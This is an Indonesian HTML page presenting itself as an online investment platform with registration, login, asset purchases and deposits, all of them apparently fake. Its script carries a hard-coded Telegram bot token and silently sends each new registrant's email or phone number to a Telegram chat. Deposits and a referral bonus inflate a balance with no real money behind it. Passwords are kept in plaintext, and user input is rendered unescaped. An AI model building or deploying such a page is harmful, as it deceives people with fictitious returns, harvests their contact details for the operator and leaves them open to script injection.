<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Investasi Online - Deposit Modal Final</title>
<style>
  * { box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0;
    background: linear-gradient(135deg, #e0f3ff 0%, #ffffff 100%);
    color: #1b2939;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  nav {
    text-align: center;
    background-color: #0d6efd;
    padding: 15px 0;
    box-shadow: 0 4px 8px rgba(13, 110, 253, 0.3);
  }
  nav button {
    background: none;
    border: none;
    color: white;
    cursor: pointer;
    font-size: 16px;
    margin: 0 12px;
    padding: 8px 14px;
    border-radius: 6px;
    transition: background-color 0.3s;
    font-weight: 600;
  }
  nav button:hover,
  nav button:focus {
    background-color: rgba(255 255 255 / 0.25);
    outline: none;
  }
  .container {
    background: white;
    max-width: 700px;
    margin: 40px auto 60px;
    border-radius: 12px;
    padding: 30px 30px 40px;
    box-shadow: 0 10px 25px rgba(13, 110, 253, 0.15);
    flex-grow: 1;
  }
  h2 {
    margin-bottom: 25px;
    font-weight: 700;
    color: #0d6efd;
    text-align: center;
    letter-spacing: 0.05em;
  }
  label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
    color: #33475b;
  }
  input[type='text'],
  input[type='password'],
  select,
  input[type='number'] {
    width: 100%;
    padding: 10px 14px;
    border: 1.8px solid #cbd5e1;
    border-radius: 8px;
    font-size: 16px;
    transition: border-color 0.3s;
  }
  input[type='text']:focus,
  input[type='password']:focus,
  select:focus,
  input[type='number']:focus {
    border-color: #0d6efd;
    outline: none;
    box-shadow: 0 0 6px #0d6efd80;
  }
  input[readonly] {
    background-color: #f8fafc;
    color: #6c757d;
    cursor: not-allowed;
  }
  button {
    width: 100%;
    background-color: #0d6efd;
    color: white;
    border: none;
    font-size: 18px;
    padding: 12px;
    margin-top: 28px;
    border-radius: 10px;
    cursor: pointer;
    font-weight: 700;
    box-shadow: 0 6px 15px #0d6efd99;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #084fc1;
    box-shadow: 0 8px 18px #084fc199;
  }
  #message, #loginMessage, #investmentMessage {
    text-align: center;
    margin-top: 16px;
    font-weight: 600;
  }
  #message, #loginMessage {
    color: #dc3545;
  }
  #investmentMessage {
    color: #198754;
  }
  #logoutBtn {
    width: 100%;
    background-color: #dc3545;
    box-shadow: 0 6px 15px #dc354599;
    margin-top: 30px;
  }
  #logoutBtn:hover {
    background-color: #b02a37;
    box-shadow: 0 8px 20px #b02a3799;
  }
  footer {
    background-color: #0d6efd;
    color: white;
    text-align: center;
    padding: 18px 10px;
    font-size: 15px;
    font-weight: 600;
    position: relative;
    bottom: 0;
    width: 100%;
    box-shadow: inset 0 1px 0 rgba(255 255 255 / 0.2);
  }
  footer a {
    color: #bbe1ff;
    margin: 0 16px;
    text-decoration: none;
    font-weight: 600;
  }
  footer a:hover {
    text-decoration: underline;
  }
  .investment-image {
    max-width: 100%;
    margin: 15px 0 25px;
    border-radius: 12px;
    box-shadow: 0 6px 20px rgba(13, 110, 253, 0.2);
  }
  .saldo-box {
    background: #e7f1ff;
    color: #0d6efd;
    font-weight: 700;
    font-size: 17px;
    text-align: center;
    padding: 10px 0;
    border-radius: 10px;
    margin-bottom: 25px;
    box-shadow: inset 0 0 8px #a3cdfd;
  }
  #depositModal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0; top: 0; width: 100%; height: 100%;
    background-color: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
  }
  #depositModalContent {
    background: white;
    padding: 25px 30px;
    border-radius: 12px;
    width: 320px;
    position: relative;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
  }
  #depositModalClose {
    position: absolute;
    top: 10px; right: 12px;
    background:none; border:none;
    font-size: 22px; cursor:pointer; color:#555;
  }
</style>
</head>
<body>
<nav>
  <button id="showRegister">Daftar Akun</button>
  <button id="showLogin">Masuk Akun</button>
  <button id="showInvest">Investasi</button>
  <button id="showUserList">Daftar User</button>
</nav>

<div id="registerPage" class="container" aria-label="Halaman Daftar Akun" style="display:none;">
  <h2>Daftar Akun Baru</h2>
  <form id="registerForm" novalidate>
    <label for="regEmailOrPhone">Email atau Nomor HP:</label>
    <input type="text" id="regEmailOrPhone" name="emailOrPhone" placeholder="Masukkan Email atau Nomor HP" required autocomplete="username" />
    <label for="regPassword">Kata Sandi:</label>
    <input type="password" id="regPassword" name="password" placeholder="Masukkan Kata Sandi" required autocomplete="new-password" minlength="6" />
    <label for="referralCode">Kode Referal:</label>
    <input type="text" id="referralCode" name="referralCode" value="UVC96" readonly />
    <button type="submit" aria-label="Daftar akun baru">Daftar</button>
  </form>
  <div id="message" role="alert" aria-live="polite"></div>
</div>

<div id="loginPage" class="container" aria-label="Halaman Masuk Akun" style="display:none;">
  <h2>Masuk Akun</h2>
  <form id="loginForm" novalidate>
    <label for="loginEmailOrPhone">Email atau Nomor HP:</label>
    <input type="text" id="loginEmailOrPhone" name="emailOrPhone" placeholder="Masukkan Email atau Nomor HP" required autocomplete="username" />
    <label for="loginPassword">Kata Sandi:</label>
    <input type="password" id="loginPassword" name="password" placeholder="Masukkan Kata Sandi" required autocomplete="current-password" />
    <button type="submit" aria-label="Masuk ke akun">Masuk</button>
  </form>
  <div id="loginMessage" role="alert" aria-live="polite"></div>
</div>

<div id="investPage" class="container" aria-label="Halaman Investasi Online" style="display:none;">
  <h2>Investasi Online</h2>
  <p>Selamat datang, <span id="userDisplay" aria-live="polite"></span>!</p>
  <div class="saldo-box">Saldo Anda: Rp <span id="userSaldo">0</span>
  </div>
  <div style="text-align: right; margin-bottom: 10px;">
    <button id="btnShowDeposit" style="background-color: #0d6efd; color: white; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: 600;">
      Deposit Saldo
    </button>
  </div>
  <img src="https://images.unsplash.com/photo-1556740738-b6a63e27c4df?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Ilustrasi investasi uang dan saham" class="investment-image" loading="lazy" />
  <form id="investmentForm" novalidate>
    <label for="assetType">Pilih Jenis Aset:</label>
    <select id="assetType" name="assetType" required>
      <option value="">-- Pilih Aset --</option>
      <option value="emas">Emas</option>
      <option value="logam">Logam Mulia</option>
      <option value="saham">Saham</option>
      <option value="crypto">Crypto</option>
    </select>
    <label for="amount">Jumlah Pembelian (Rp):</label>
    <input type="text" id="amount" name="amount" placeholder="Masukkan Jumlah" required pattern="^\d+$" />
    <button type="submit" aria-label="Beli aset sekarang">Beli Sekarang</button>
  </form>
  <div id="investmentMessage" role="alert" aria-live="polite" style="margin-bottom: 20px;"></div>
  <button id="logoutBtn" aria-label="Logout dari akun" style="margin-top: 40px;">Logout</button>
</div>

<div id="userListPage" class="container" aria-label="Daftar User Terdaftar" style="display:none;">
  <h2>Daftar User Terdaftar</h2>
  <table class="users-table" aria-describedby="userListDesc">
    <thead>
      <tr>
        <th>No</th>
        <th>Email / Nomor HP</th>
        <th>Kode Referal</th>
        <th>Saldo (Rp)</th>
      </tr>
    </thead>
    <tbody id="userListBody"></tbody>
  </table>
  <p id="userListDesc" style="display:none;">Tabel daftar user yang sudah terdaftar pada aplikasi investasi online.</p>
</div>

<!-- Modal Deposit -->
<div id="depositModal">
  <div id="depositModalContent">
    <button id="depositModalClose" aria-label="Tutup">&times;</button>
    <h3 style="text-align:center; color:#0d6efd; margin-bottom: 15px;">Deposit Saldo</h3>
    <form id="modalDepositForm" novalidate>
      <label for="modalDepositAmount" style="font-weight:600; margin-bottom:6px; display: block;">Jumlah Deposit (Rp):</label>
      <input type="number" id="modalDepositAmount" name="modalDepositAmount" placeholder="Minimal Rp 1.000" min="1000" required />
      <button type="submit" style="background-color: #0d6efd; color: white; padding: 10px 0; border: none; border-radius: 8px; width: 100%; font-weight: 700; cursor: pointer; box-shadow: 0 6px 15px #0d6efd99; transition: background-color 0.3s ease;">Deposit Sekarang</button>
    </form>
    <div id="modalDepositMessage" role="alert" aria-live="polite" style="margin-top: 10px; font-weight: 600; color:#dc3545;"></div>
  </div>
</div>
<footer>
  <span>© 2025 InvestasiOnline • Dibuat 21 Juli 2025</span> |
  <a href="#" title="Tentang Website">Tentang Web</a> |
  <a href="#" title="Kebijakan Privasi">Privacy Policy</a> |
  <a href="#" title="Pusat Bantuan">Pusat Bantuan</a>
</footer>

<script>
// == Kirim ke Telegram setelah Register ==
const TELEGRAM_BOT_TOKEN = '7316410414:AAGNX59ZcR9pdUzpXBMvDd089E3-U_z39Mg';
const TELEGRAM_CHAT_ID = '7242834240';
async function sendTelegramNotification(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  };
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    if (!data.ok) {
      console.warn('Telegram API response error:', data.description);
    }
  } catch (err) {
    console.error('Error mengirim pesan Telegram:', err);
  }
}

// --- Seluruh script utama di bawah ini --
const registerPage = document.getElementById("registerPage");
const loginPage = document.getElementById("loginPage");
const investPage = document.getElementById("investPage");
const userListPage = document.getElementById("userListPage");
const message = document.getElementById("message");
const loginMessage = document.getElementById("loginMessage");
const investmentMessage = document.getElementById("investmentMessage");
const btnShowDeposit = document.getElementById("btnShowDeposit");
const depositModal = document.getElementById("depositModal");
const depositModalClose = document.getElementById("depositModalClose");
const modalDepositForm = document.getElementById("modalDepositForm");
const modalDepositMessage = document.getElementById("modalDepositMessage");
const userDisplay = document.getElementById("userDisplay");
const userSaldoEl = document.getElementById("userSaldo");
const userListBody = document.getElementById("userListBody");

function isLoggedIn() { return !!localStorage.getItem("currentUser"); }
function getCurrentUser() { return JSON.parse(localStorage.getItem("currentUser")); }
function saveCurrentUser(user) { localStorage.setItem("currentUser", JSON.stringify(user)); }
function saveUsers(users) { localStorage.setItem("users", JSON.stringify(users)); }
function getUsers() { return JSON.parse(localStorage.getItem("users") || "[]"); }
function formatRupiah(angka) {
  if (typeof angka !== "number") return "0";
  return angka.toLocaleString("id-ID", {minimumFractionDigits:0, maximumFractionDigits:0}) || "0";
}
function updateUserData(updatedUser) {
  let users = getUsers();
  const idx = users.findIndex(u => u.emailOrPhone.toLowerCase() === updatedUser.emailOrPhone.toLowerCase());
  if (idx !== -1) {
    users[idx] = updatedUser;
    saveUsers(users); saveCurrentUser(updatedUser);
  }
}
function hideAllPages() {
  registerPage.style.display = "none";
  loginPage.style.display = "none";
  investPage.style.display = "none";
  userListPage.style.display = "none";
  message.textContent = "";
  loginMessage.textContent = "";
  investmentMessage.textContent = "";
  modalDepositMessage.textContent = "";
}
function showRegister() { hideAllPages(); registerPage.style.display = "block"; }
function showLogin() { hideAllPages(); loginPage.style.display = "block"; }
function showInvest() {
  hideAllPages(); investPage.style.display = "block";
  const user = getCurrentUser();
  if (user) { userDisplay.textContent = user.emailOrPhone; userSaldoEl.textContent = formatRupiah(user.saldo); }
}
function showUserList() { hideAllPages(); userListPage.style.display = "block"; renderUserList(); }
function renderUserList() {
  const users = getUsers();
  userListBody.innerHTML = "";
  if (users.length === 0) {
    userListBody.innerHTML = '<tr><td colspan="4">Belum ada user terdaftar.</td></tr>';
    return;
  }
  users.forEach((user, i) => {
    const tr = document.createElement("tr");
    tr.innerHTML = `<td>${i + 1}</td><td>${user.emailOrPhone}</td><td>${user.referralCode}</td><td>Rp ${formatRupiah(user.saldo)}</td>`;
    userListBody.appendChild(tr);
  });
}
document.getElementById("showRegister").addEventListener("click", showRegister);
document.getElementById("showLogin").addEventListener("click", showLogin);
document.getElementById("showInvest").addEventListener("click", () => {
  if(isLoggedIn()) showInvest();
  else { alert("Silakan masuk atau daftar akun terlebih dahulu."); showLogin(); }
});
document.getElementById("showUserList").addEventListener("click", () => {
  if(isLoggedIn()) showUserList();
  else { alert("Silakan login dahulu untuk melihat daftar user."); showLogin(); }
});
document.getElementById("logoutBtn").onclick = () => { localStorage.removeItem("currentUser"); alert("Anda berhasil logout"); showLogin(); };

// ============= Event REGISTER (DAFTAR) USER =============
document.getElementById("registerForm").addEventListener("submit", async function(e) {
  e.preventDefault();
  message.textContent = "";

  const emailOrPhone = this.regEmailOrPhone.value.trim();
  const password = this.regPassword.value.trim();
  const referralCode = this.referralCode.value.trim();

  if (!emailOrPhone || !password) {
    message.textContent = "Email atau Nomor HP dan kata sandi wajib diisi.";
    return;
  }
  if (password.length < 6) {
    message.textContent = "Kata sandi minimal 6 karakter.";
    return;
  }

  let users = getUsers();
  const exists = users.find(u => u.emailOrPhone.toLowerCase() === emailOrPhone.toLowerCase());
  if (exists) {
    message.textContent = "Email atau Nomor HP sudah terdaftar.";
    return;
  }

  let saldoAwal = 0;
  if (referralCode === "UVC96") saldoAwal = 100000;

  const newUser = { emailOrPhone, password, referralCode, saldo: saldoAwal };

  users.push(newUser);
  saveUsers(users);
  saveCurrentUser(newUser);

  this.reset();
  this.referralCode.value = "UVC96";

  alert("Pendaftaran berhasil! Anda akan otomatis masuk.");

  // Kirim ke admin Telegram
  const telegramMessage = `<b>User Baru Terdaftar</b>\n\nEmail/HP: <code>${emailOrPhone}</code>\nKode Referal: <b>${referralCode}</b>\nSaldo Awal: Rp ${saldoAwal.toLocaleString('id-ID')}`;
  await sendTelegramNotification(telegramMessage);

  showInvest();
});

// =========== Login & Investasi handler seperti biasa ===========
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  loginMessage.textContent = "";

  const emailOrPhone = this.loginEmailOrPhone.value.trim();
  const password = this.loginPassword.value.trim();

  if (!emailOrPhone || !password) {
    loginMessage.textContent = "Email/HP dan kata sandi wajib diisi.";
    return;
  }
  const users = getUsers();
  const user = users.find(u => u.emailOrPhone.toLowerCase() === emailOrPhone.toLowerCase() && u.password === password);

  if (user) {
    saveCurrentUser(user);
    this.reset();
    alert("Login berhasil! Selamat datang kembali.");
    showInvest();
  } else {
    loginMessage.textContent = "Email/Nomor HP atau Kata Sandi salah.";
  }
});
document.getElementById("investmentForm").addEventListener("submit", function(e) {
  e.preventDefault();
  investmentMessage.textContent = "";

  const assetType = this.assetType.value;
  const amountStr = this.amount.value.trim();

  if (!assetType) {
    investmentMessage.style.color = "red";
    investmentMessage.textContent = "Pilih jenis aset terlebih dahulu.";
    return;
  }
  if (!/^\d+$/.test(amountStr) || Number(amountStr) <= 0) {
    investmentMessage.style.color = "red";
    investmentMessage.textContent = "Masukkan jumlah valid (angka > 0).";
    return;
  }
  const amount = Number(amountStr);

  let user = getCurrentUser();
  if (user.saldo < amount) {
    investmentMessage.style.color = "red";
    investmentMessage.textContent = `Saldo tidak cukup. Saldo Anda: Rp ${formatRupiah(user.saldo)}`;
    return;
  }

  user.saldo -= amount;
  updateUserData(user);
  userSaldoEl.textContent = formatRupiah(user.saldo);

  investmentMessage.style.color = "green";
  investmentMessage.textContent = `Berhasil membeli ${assetType.toUpperCase()} senilai Rp ${formatRupiah(amount)}. Saldo tersisa: Rp ${formatRupiah(user.saldo)}`;
  this.reset();
});
// Modal Deposit handler tetap
btnShowDeposit.onclick = () => { modalDepositMessage.textContent = ""; modalDepositForm.reset(); depositModal.style.display = "flex"; };
depositModalClose.onclick = () => { depositModal.style.display = "none"; };
window.onclick = (event) => { if (event.target === depositModal) { depositModal.style.display = "none"; }};
modalDepositForm.addEventListener("submit", (e) => {
  e.preventDefault();
  modalDepositMessage.style.color = "#dc3545";
  modalDepositMessage.textContent = "";

  const amountStr = e.target.modalDepositAmount.value.trim();
  if (!/^\d+$/.test(amountStr) || Number(amountStr) < 1000) {
    modalDepositMessage.textContent = "Jumlah deposit minimal Rp 1.000.";
    return;
  }
  const amount = Number(amountStr);
  let user = getCurrentUser();
  if (!user) {
    modalDepositMessage.textContent = "User tidak ditemukan, silakan login ulang.";
    return;
  }
  user.saldo += amount;
  updateUserData(user);
  userSaldoEl.textContent = formatRupiah(user.saldo);

  modalDepositMessage.style.color = "#198754";
  modalDepositMessage.textContent = `Deposit Rp ${formatRupiah(amount)} berhasil!`;
  e.target.reset();

  setTimeout(() => {
    depositModal.style.display = "none";
  }, 1500);
});
// Initial page load
window.onload = () => { if (isLoggedIn()) showInvest(); else showLogin(); };
</script>
</body>
    </html>
    
